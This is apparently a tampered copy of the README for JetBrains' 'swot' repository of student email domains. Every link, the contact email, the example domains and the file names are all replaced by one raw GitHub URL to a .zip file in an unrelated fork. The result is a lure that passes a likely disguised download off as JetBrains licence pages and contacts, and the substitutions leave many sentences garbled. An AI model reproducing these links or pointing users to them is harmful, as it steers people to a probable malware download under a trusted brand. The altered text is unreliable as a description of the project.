[![official JetBrains project](https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip)](https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip+on+GitHub)
# swot

JetBrains uses this **swot** repository to grant free licenses for JetBrains tools to students and teachers worldwide. If your email is in one of the domains listed in this repository, you may request your free license from JetBrains. Visit https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip to request!
...
**Please notice that some email domains were abused in the past, and we don't trust them now**. The list of such domains is in the file https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip If you are a student with email address in an abused domain, please request your free license with GitHub or ISIC authentication at **GitHub** or **ISIC** tabs at https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip Teachers can request their licenses with their official documents, too (**Official Document** tab at https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip

If you believe that a domain is in the list of abused ones by mistake, please email us at https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip
...
If you represent a primary or secondary school and you are certain of the necessity of a professional version of a JetBrains tool for your school, please contact JetBrains sales team via https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip
...
1. Each domain is represented by a single `.txt` file in the repository. If there is a file `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip`, it means that an email domain `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` is included in the repository. Please note that the repository reverses the order of the name components, and also note that **.txt extension is mandatory**. Example: add file `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` to add a domain `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` to the repository.

2. Pull requests can include one or more files which you wish to add.

3. Each file in the repository has to contain the name of the university, which the domain represented by the file belongs to. For example, a file `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` has to contain a line in it: *"Federal University of Agriculture, Abeokuta"*.
...
Please refer to the `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` file in this repository to read more about the repository structure and contributing rules.

## FAQ
#### There are many domains in my university, how can I add all of them?
If all the domains used for teachers' and students' email are in the same upper-level domain, you can add the upper-level domain. For example, if there is a domain `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` owned by a university, and there are subdomains such as `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` and `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip`, used by the students and the teachers respectively, you can add `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` domain only, and both students and teachers will be able to request their free licenses.
...
If the university uses several email domains in different upper-level domains (for example, `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip` and `https://raw.githubusercontent.com/osnux/swot/master/lib/domains/lu/Software-newly.zip`), please submit several files with different paths and the same content (i.e., same name of the university) in your pull request.
